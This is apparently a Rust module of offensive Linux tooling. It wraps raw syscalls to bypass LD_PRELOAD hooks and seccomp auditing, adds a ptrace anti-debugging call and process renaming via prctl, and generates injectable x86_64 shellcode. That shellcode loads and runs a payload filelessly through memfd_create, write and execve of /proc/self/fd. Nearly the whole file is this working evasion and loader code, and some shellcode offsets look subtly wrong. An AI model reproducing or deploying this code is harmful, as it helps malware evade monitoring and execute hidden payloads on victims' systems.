//! Direct syscall primitives for Linux.
//!
//! Bypasses LD_PRELOAD hooks, seccomp-BPF auditing wrappers, and
//! userland library interposition by invoking syscalls directly
//! via inline assembly or libc::syscall().

/// Linux syscall numbers for x86_64
pub mod x86_64 {
    pub const SYS_READ: i64 = 0;
    pub const SYS_WRITE: i64 = 1;
    pub const SYS_OPEN: i64 = 2;
    pub const SYS_CLOSE: i64 = 3;
    pub const SYS_MMAP: i64 = 9;
    pub const SYS_MPROTECT: i64 = 10;
    pub const SYS_MUNMAP: i64 = 11;
    pub const SYS_EXECVE: i64 = 59;
    pub const SYS_PTRACE: i64 = 101;
    pub const SYS_GETPID: i64 = 39;
    pub const SYS_GETUID: i64 = 102;
    pub const SYS_MEMFD_CREATE: i64 = 319;
    pub const SYS_FORK: i64 = 57;
    pub const SYS_KILL: i64 = 62;
    pub const SYS_SOCKET: i64 = 41;
    pub const SYS_CONNECT: i64 = 42;
    pub const SYS_SENDTO: i64 = 44;
    pub const SYS_RECVFROM: i64 = 45;
    pub const SYS_PRCTL: i64 = 157;
}

/// Direct syscall wrappers that bypass libc
pub mod direct {
    /// memfd_create via direct syscall
    #[cfg(target_os = "linux")]
    pub fn memfd_create(name: &[u8], flags: u32) -> Result<i32, i32> {
        let result = unsafe {
            libc::syscall(
                super::x86_64::SYS_MEMFD_CREATE,
                name.as_ptr(),
                flags as libc::c_uint,
            )
        } as i32;
        if result < 0 { Err(result) } else { Ok(result) }
    }

    /// mmap via direct syscall
    #[cfg(target_os = "linux")]
    pub fn mmap(
        addr: usize,
        length: usize,
        prot: i32,
        flags: i32,
        fd: i32,
        offset: i64,
    ) -> Result<*mut u8, i32> {
        let result = unsafe {
            libc::syscall(
                super::x86_64::SYS_MMAP,
                addr,
                length,
                prot,
                flags,
                fd,
                offset,
            )
        } as *mut u8;
        if result as isize == -1 {
            Err(unsafe { *libc::__errno_location() })
        } else {
            Ok(result)
        }
    }

    /// mprotect via direct syscall
    #[cfg(target_os = "linux")]
    pub fn mprotect(addr: *mut u8, length: usize, prot: i32) -> Result<(), i32> {
        let result = unsafe {
            libc::syscall(super::x86_64::SYS_MPROTECT, addr, length, prot)
        } as i32;
        if result < 0 { Err(result) } else { Ok(()) }
    }

    /// write via direct syscall
    #[cfg(target_os = "linux")]
    pub fn write(fd: i32, buf: &[u8]) -> Result<usize, i32> {
        let result = unsafe {
            libc::syscall(
                super::x86_64::SYS_WRITE,
                fd,
                buf.as_ptr(),
                buf.len(),
            )
        } as isize;
        if result < 0 { Err(result as i32) } else { Ok(result as usize) }
    }

    /// execve via direct syscall (bypasses libc wrapper)
    #[cfg(target_os = "linux")]
    pub fn execve(
        path: &std::ffi::CStr,
        argv: &[*const libc::c_char],
        envp: &[*const libc::c_char],
    ) -> Result<(), i32> {
        let result = unsafe {
            libc::syscall(
                super::x86_64::SYS_EXECVE,
                path.as_ptr(),
                argv.as_ptr(),
                envp.as_ptr(),
            )
        } as i32;
        Err(result) // execve only returns on error
    }

    /// ptrace(PTRACE_TRACEME) for anti-debug
    #[cfg(target_os = "linux")]
    pub fn ptrace_traceme() -> Result<(), i32> {
        let result = unsafe {
            libc::syscall(super::x86_64::SYS_PTRACE, 0i64, 0i64, 0i64, 0i64)
        } as i32;
        if result < 0 { Err(result) } else { Ok(()) }
    }

    /// prctl for process name changes and security bits
    #[cfg(target_os = "linux")]
    pub fn prctl(option: i32, arg2: u64) -> Result<i32, i32> {
        let result = unsafe {
            libc::syscall(super::x86_64::SYS_PRCTL, option, arg2, 0i64, 0i64, 0i64)
        } as i32;
        if result < 0 { Err(result) } else { Ok(result) }
    }
}

/// Generate x86_64 shellcode bytes for a direct syscall invocation.
/// This creates a minimal code snippet that can be injected into a process
/// to perform a syscall without going through libc.
pub fn generate_syscall_stub(syscall_nr: i64) -> Vec<u8> {
    let nr_bytes = (syscall_nr as u32).to_le_bytes();
    vec![
        // Arguments should already be in rdi, rsi, rdx, r10, r8, r9
        0x48, 0xC7, 0xC0,                    // mov rax, imm32
        nr_bytes[0], nr_bytes[1], nr_bytes[2], nr_bytes[3],
        0x0F, 0x05,                            // syscall
        0xC3,                                  // ret
    ]
}

/// Generate a syscall stub with register setup for common operations
pub fn generate_memfd_exec_stub() -> Vec<u8> {
    let mut stub = Vec::new();

    // Save payload address (passed in rdi)
    stub.extend_from_slice(&[
        0x49, 0x89, 0xFE,                    // mov r14, rdi (payload ptr)
        0x49, 0x89, 0xF7,                    // mov r15, rsi (payload len)
    ]);

    // memfd_create("", MFD_CLOEXEC)
    stub.extend_from_slice(&[
        0xEB, 0x01,                            // jmp over null
        0x00,                                  // null byte for name
        0x48, 0x8D, 0x3D, 0xFA, 0xFF, 0xFF, 0xFF, // lea rdi, [rip-6]
        0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, // mov rsi, 1
        0x48, 0xC7, 0xC0, 0x3F, 0x01, 0x00, 0x00, // mov rax, 319
        0x0F, 0x05,                            // syscall
        0x49, 0x89, 0xC4,                      // mov r12, rax (fd)
    ]);

    // write(fd, payload, len)
    stub.extend_from_slice(&[
        0x4C, 0x89, 0xE7,                    // mov rdi, r12
        0x4C, 0x89, 0xF6,                    // mov rsi, r14
        0x4C, 0x89, 0xFA,                    // mov rdx, r15
        0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1 (write)
        0x0F, 0x05,                            // syscall
    ]);

    // Build "/proc/self/fd/N" path
    stub.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x20,              // sub rsp, 32
        0x48, 0x89, 0xE7,                    // mov rdi, rsp
        0x48, 0xB8,                            // mov rax, "/proc/se"
    ]);
    stub.extend_from_slice(b"/proc/se");
    stub.extend_from_slice(&[
        0x48, 0x89, 0x07,                    // mov [rdi], rax
        0x48, 0xB8,                            // mov rax, "lf/fd/\0\0"
    ]);
    stub.extend_from_slice(b"lf/fd/\0\0");
    stub.extend_from_slice(&[
        0x48, 0x89, 0x47, 0x08,              // mov [rdi+8], rax
        0x4C, 0x89, 0xE0,                    // mov rax, r12
        0x48, 0x83, 0xC0, 0x30,              // add rax, '0'
        0x88, 0x47, 0x0E,                    // mov [rdi+14], al
        0xC6, 0x47, 0x0F, 0x00,              // mov byte [rdi+15], 0
    ]);

    // execve(path, {path, NULL}, NULL)
    stub.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x10,              // sub rsp, 16
        0x48, 0x89, 0x3C, 0x24,              // mov [rsp], rdi
        0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, // [rsp+8] = NULL
        0x48, 0x89, 0xE6,                    // mov rsi, rsp (argv)
        0x48, 0x31, 0xD2,                    // xor rdx, rdx (envp=NULL)
        0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, // mov rax, 59 (execve)
        0x0F, 0x05,                            // syscall
    ]);

    stub
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_syscall_stub_generation() {
        let stub = generate_syscall_stub(x86_64::SYS_GETPID);
        // Should be: mov rax, 39; syscall; ret
        assert_eq!(stub.len(), 10);
        assert_eq!(stub[3], 39); // syscall number
        assert_eq!(&stub[7..9], &[0x0F, 0x05]); // syscall instruction
        assert_eq!(stub[9], 0xC3); // ret
    }

    #[test]
    fn test_memfd_exec_stub() {
        let stub = generate_memfd_exec_stub();
        assert!(!stub.is_empty());
        // Should contain syscall instructions
        let syscall_count = stub.windows(2)
            .filter(|w| w == &[0x0F, 0x05])
            .count();
        assert!(syscall_count >= 3); // memfd_create, write, execve
    }

    #[test]
    fn test_all_syscall_numbers() {
        // Verify key syscall numbers are correct for x86_64 Linux
        assert_eq!(x86_64::SYS_MEMFD_CREATE, 319);
        assert_eq!(x86_64::SYS_EXECVE, 59);
        assert_eq!(x86_64::SYS_MMAP, 9);
        assert_eq!(x86_64::SYS_WRITE, 1);
    }
}
